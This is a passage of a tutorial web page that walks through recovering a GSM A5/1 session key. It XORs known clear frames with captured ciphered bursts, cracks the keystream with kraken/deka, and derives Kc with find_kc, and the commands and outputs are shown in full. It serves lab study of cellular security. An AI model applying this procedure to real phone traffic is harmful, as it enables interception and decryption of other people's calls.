+0000030349061d9f6d1810800000000000000000000000</p>
+<p>Generate the frame corresponding with GSMFramecoder</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Decoding 0000030349061d9f6d1810800000000000000000000000
+Encoded Frame, Burst1:
+001000000001010000100000001100100010000011000000100000000110101000000000001011010001000000110100001000101001000110
+Encoded Frame, Burst2:
+000000000111101000110000100000101100000011101010000000000010010101000000001100000010000000010101000010101100010100
+Encoded Frame, Burst3:
+100100010100101000000001011000010000010100000001010000000001000000110000000001001000000001000000001000000000111010
+Encoded Frame, Burst4:
+110000001100100100000101000010010101000000000000000100000001010100001010000000000010100100011110000000000010101000
+</pre></div>
+</div>
+<p>Next we will XOR Clear and Ciphered Frame</p>
+<p>Clear          Frame 862242
+Same ciphered  +102  862344
+Same ciphered  +102  862446</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>C1 862446 1332352: 010010100010111111011010010010111000000101010000100100111111001010100111110000101001110000101110100011111000010001
+P1 862446 1332352: 010010100010111111011010010010111000000101010000100100111111001010100111110000101001110000101110100011111000010001
+S1 862446 1332352: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+C0 862447 1332385: 011100001000110111001101011011111001010000110001101001000100000011111101000110010100011001100001100100000010101110
+P0 862447 1332385: 011100001000110111001101011011111001010000110001101001000100000011111101000110010100011001100001100100000010101110
+S0 862447 1332385: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+C0 862448 1332418: 111010110111001011110001011101101100010000101110111000010000000101110001010100100101011010000010110110110111001011
+P0 862448 1332418: 111010110111001011110001011101101100010000101110111000010000000101110001010100100101011010000010110110110111001011
+S0 862448 1332418: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+C0 862449 1332451: 011111110010110100001100001101110001001110100011010010111001001010111001001101000010111100101100110100000110110000
+P0 862449 1332451: 011111110010110100001100001101110001001110100011010010111001001010111001001101000010111100101100110100000110110000
+S0 862449 1332451: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+</pre></div>
+</div>
+<p>Let’s delete redondancies (keep only C1 and C0)</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>C1 862446 1332352: 010010100010111111011010010010111000000101010000100100111111001010100111110000101001110000101110100011111000010001
+C0 862447 1332385: 011100001000110111001101011011111001010000110001101001000100000011111101000110010100011001100001100100000010101110
+C0 862448 1332418: 111010110111001011110001011101101100010000101110111000010000000101110001010100100101011010000010110110110111001011
+C0 862449 1332451: 011111110010110100001100001101110001001110100011010010111001001010111001001101000010111100101100110100000110110000
+</pre></div>
+</div>
+<p>At least xor the clear frame reencoded by GSMFramcoder and Ciphered ones</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>conda<span class="w"> </span>activate<span class="w"> </span>py27
+<span class="nb">cd</span><span class="w"> </span>/root/kraken/Utilities/
+python<span class="w"> </span>xor.py<span class="w"> </span><span class="m">010010100010111111011010010010111000000101010000100100111111001010100111110000101001110000101110100011111000010001</span><span class="w"> </span><span class="m">001000000001010000100000001100100010000011000000100000000110101000000000001011010001000000110100001000101001000110</span>
+python<span class="w"> </span>xor.py<span class="w"> </span><span class="m">011100001000110111001101011011111001010000110001101001000100000011111101000110010100011001100001100100000010101110</span><span class="w"> </span><span class="m">000000000111101000110000100000101100000011101010000000000010010101000000001100000010000000010101000010101100010100</span>
+python<span class="w"> </span>xor.py<span class="w"> </span><span class="m">111010110111001011110001011101101100010000101110111000010000000101110001010100100101011010000010110110110111001011</span><span class="w"> </span><span class="m">100100010100101000000001011000010000010100000001010000000001000000110000000001001000000001000000001000000000111010</span>
+python<span class="w"> </span>xor.py<span class="w"> </span><span class="m">011111110010110100001100001101110001001110100011010010111001001010111001001101000010111100101100110100000110110000</span><span class="w"> </span><span class="m">110000001100100100000101000010010101000000000000000100000001010100001010000000000010100100011110000000000010101000</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@legion:~/kraken/Utilities#<span class="w"> </span><span class="nb">source</span><span class="w"> </span>~/miniconda3/bin/activate<span class="w"> </span>
+<span class="o">(</span>base<span class="o">)</span><span class="w"> </span>root@legion:~/kraken/Utilities#<span class="w"> </span>conda<span class="w"> </span>activate<span class="w"> </span>py27
+<span class="o">(</span>py27<span class="o">)</span><span class="w"> </span>root@legion:~/kraken/Utilities#<span class="w"> </span>python<span class="w"> </span>xor.py<span class="w"> </span><span class="m">010010100010111111011010010010111000000101010000100100111111001010100111110000101001110000101110100011111000010001</span><span class="w"> </span><span class="m">001000000001010000100000001100100010000011000000100000000110101000000000001011010001000000110100001000101001000110</span>
+<span class="m">011010100011101111111010011110011010000110010000000100111001100010100111111011111000110000011010101011010001010111</span>
+<span class="o">(</span>py27<span class="o">)</span><span class="w"> </span>root@legion:~/kraken/Utilities#<span class="w"> </span>python<span class="w"> </span>xor.py<span class="w"> </span><span class="m">011100001000110111001101011011111001010000110001101001000100000011111101000110010100011001100001100100000010101110</span><span class="w"> </span><span class="m">000000000111101000110000100000101100000011101010000000000010010101000000001100000010000000010101000010101100010100</span>
+<span class="m">011100001111011111111101111011010101010011011011101001000110010110111101001010010110011001110100100110101110111010</span>
+<span class="o">(</span>py27<span class="o">)</span><span class="w"> </span>root@legion:~/kraken/Utilities#<span class="w"> </span>python<span class="w"> </span>xor.py<span class="w"> </span><span class="m">111010110111001011110001011101101100010000101110111000010000000101110001010100100101011010000010110110110111001011</span><span class="w"> </span><span class="m">100100010100101000000001011000010000010100000001010000000001000000110000000001001000000001000000001000000000111010</span>
+<span class="m">011110100011100011110000000101111100000100101111101000010001000101000001010101101101011011000010111110110111110001</span>
+<span class="o">(</span>py27<span class="o">)</span><span class="w"> </span>root@legion:~/kraken/Utilities#<span class="w"> </span>python<span class="w"> </span>xor.py<span class="w"> </span><span class="m">011111110010110100001100001101110001001110100011010010111001001010111001001101000010111100101100110100000110110000</span><span class="w"> </span><span class="m">110000001100100100000101000010010101000000000000000100000001010100001010000000000010100100011110000000000010101000</span>
+<span class="m">101111111110010000001001001111100100001110100011010110111000011110110011001101000000011000110010110100000100011000</span>
+</pre></div>
+</div>
+<p>Next use kraken or deka to crack the keystream :</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>nirvana@legion:~$ telnet 0 6666
+Trying 0.0.0.0...
+Connected to 0.
+Escape character is &#39;^]&#39;.
+crack 101111111110010000001001001111100100001110100011010110111000011110110011001101000000011000110010110100000100011000
+Cracking #1 101111111110010000001001001111100100001110100011010110111000011110110011001101000000011000110010110100000100011000
+Found D5EB21665D2B8F25 @ 13 #1 (table:172)
+crack #1 took 6249 msec
+</pre></div>
+</div>
+<p>convert Hexadecimal result to decimal one :
+<a class="reference external" href="https://www.rapidtables.com/convert/number/hex-to-decimal.html">online converter</a></p>
+<p><img alt="hex_dec.png" src="../../_images/hex_dec.png" /></p>
+<p>add x at the end</p>
+<p>D5EB21665D2B8F25-&gt;15414450873139171109x</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@legion</span><span class="p">:</span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">kraken</span><span class="o">/</span><span class="n">Utilities</span><span class="c1"># ./find_kc 15414450873139171109x 13 1332451 1332352  011010100011101111111010011110011010000110010000000100111001100010100111111011111000110000011010101011010001010111</span>
+<span class="c1">#### Found potential key (bits: 13)####</span>
+<span class="n">f4ae37016b1fa0cb</span> <span class="o">-&gt;</span> <span class="n">f4ae37016b1fa0cb</span>
+<span class="n">Framecount</span> <span class="ow">is</span> <span class="mi">1332451</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">0</span><span class="p">):</span> <span class="n">b7</span> <span class="mi">09</span> <span class="mi">2</span><span class="n">a</span> <span class="n">b2</span> <span class="n">c9</span> <span class="mi">5</span><span class="n">c</span> <span class="mi">86</span> <span class="mi">32</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span> <span class="mi">1</span><span class="n">e</span> <span class="n">f0</span> <span class="mi">0</span><span class="n">b</span> <span class="n">ab</span> <span class="mi">3</span><span class="n">b</span> <span class="n">ac</span> <span class="mi">70</span> <span class="mi">02</span>  <span class="o">***</span> <span class="n">MATCHED</span> <span class="o">***</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span> <span class="mi">9</span><span class="n">f</span> <span class="mi">5</span><span class="n">b</span> <span class="mi">40</span> <span class="mi">35</span> <span class="mi">57</span> <span class="n">b2</span> <span class="mi">96</span> <span class="mi">4</span><span class="n">d</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span> <span class="mi">95</span> <span class="mi">1</span><span class="n">a</span> <span class="n">d4</span> <span class="mi">22</span> <span class="mi">96</span> <span class="mi">88</span> <span class="mi">07</span> <span class="n">d3</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span> <span class="n">c7</span> <span class="mi">56</span> <span class="mi">6</span><span class="n">a</span> <span class="n">bf</span> <span class="mi">4</span><span class="n">d</span> <span class="n">f7</span> <span class="mi">03</span> <span class="n">e9</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span> <span class="mi">65</span> <span class="n">a6</span> <span class="mi">53</span> <span class="n">ac</span> <span class="n">c6</span> <span class="n">d8</span> <span class="n">ae</span> <span class="mi">88</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span> <span class="mi">66</span> <span class="mi">73</span> <span class="mi">71</span> <span class="mi">0</span><span class="n">d</span> <span class="mi">9</span><span class="n">b</span> <span class="n">ee</span> <span class="mi">51</span> <span class="n">c9</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span> <span class="mi">2</span><span class="n">b</span> <span class="n">fe</span> <span class="mi">62</span> <span class="mi">6</span><span class="n">c</span> <span class="n">b5</span> <span class="n">e7</span> <span class="mi">2</span><span class="n">b</span> <span class="mi">56</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span> <span class="mi">7</span><span class="n">a</span> <span class="n">af</span> <span class="mi">0</span><span class="n">d</span> <span class="mi">42</span> <span class="mi">60</span> <span class="mi">37</span> <span class="mi">58</span> <span class="mi">51</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">90</span> <span class="mi">29</span> <span class="mi">61</span> <span class="mi">5</span><span class="n">e</span> <span class="mi">69</span> <span class="mi">46</span> <span class="mi">97</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span> <span class="n">f4</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">34</span> <span class="n">bb</span> <span class="n">ab</span> <span class="mi">58</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">8</span><span class="n">e</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span> <span class="n">be</span> <span class="mi">6</span><span class="n">b</span> <span class="mi">93</span> <span class="mi">47</span> <span class="n">fb</span> <span class="n">c1</span> <span class="mi">4</span><span class="n">e</span> <span class="mi">3</span><span class="n">e</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">12</span><span class="p">):</span> <span class="mi">32</span> <span class="n">aa</span> <span class="n">a8</span> <span class="n">b1</span> <span class="n">e6</span> <span class="mi">4</span><span class="n">e</span> <span class="n">ab</span> <span class="n">dc</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">13</span><span class="p">):</span> <span class="n">d2</span> <span class="mi">94</span> <span class="n">fb</span> <span class="mi">04</span> <span class="mi">7</span><span class="n">f</span> <span class="mi">88</span> <span class="mi">99</span> <span class="n">e2</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span> <span class="mi">62</span> <span class="mi">38</span> <span class="mi">25</span> <span class="mi">68</span> <span class="mi">8</span><span class="n">d</span> <span class="mi">42</span> <span class="mi">02</span> <span class="n">cc</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span> <span class="mi">4</span><span class="n">a</span> <span class="mi">71</span> <span class="mi">63</span> <span class="mi">84</span> <span class="mi">38</span> <span class="n">c4</span> <span class="mi">56</span> <span class="mi">44</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span> <span class="mi">1</span><span class="n">a</span> <span class="n">f8</span> <span class="n">c2</span> <span class="mi">36</span> <span class="mi">78</span> <span class="n">a0</span> <span class="n">bb</span> <span class="n">a3</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">17</span><span class="p">):</span> <span class="mi">3</span><span class="n">a</span> <span class="mi">46</span> <span class="mi">17</span> <span class="mi">3</span><span class="n">a</span> <span class="n">fc</span> <span class="mi">34</span> <span class="mi">63</span> <span class="mi">76</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">18</span><span class="p">):</span> <span class="mi">93</span> <span class="n">bf</span> <span class="mi">36</span> <span class="mi">23</span> <span class="mi">0</span><span class="n">e</span> <span class="n">c4</span> <span class="mi">95</span> <span class="mi">46</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">19</span><span class="p">):</span> <span class="mi">89</span> <span class="mi">0</span><span class="n">e</span> <span class="mi">5</span><span class="n">b</span> <span class="mi">7</span><span class="n">f</span> <span class="mi">3</span><span class="n">e</span> <span class="n">c8</span> <span class="mi">86</span> <span class="mi">37</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span> <span class="n">b4</span> <span class="mi">93</span> <span class="mi">2</span><span class="n">e</span> <span class="n">c3</span> <span class="mi">37</span> <span class="mi">5</span><span class="n">b</span> <span class="mi">57</span> <span class="n">a9</span>  <span class="n">mismatch</span>
+<span class="n">KC</span><span class="p">(</span><span class="mi">21</span><span class="p">):</span> <span class="n">e4</span> <span class="mi">0</span><span class="n">d</span> <span class="mi">18</span> <span class="mi">32</span> <span class="n">aa</span> <span class="n">c6</span> <span class="mi">48</span> <span class="n">c7</span>  <span class="n">mismatch</span>
+</pre></div>
+</div>
+<p>This match to the key of the cfile</p>
+<p>KC(1): 1e f0 0b ab 3b ac 70 02  *** MATCHED ***</p>
+<p>vf_call6_a725_d174_g5_Kc1EF00BAB3BAC7002.cfile</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="osmocombb.html" class="btn btn-neutral float-left" title="OsmocomBB" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="../3G/index.html" class="btn btn-neutral float-right" title="3G : UMTS/HSPA/HSPA+" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025, Bastien Baranoff.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
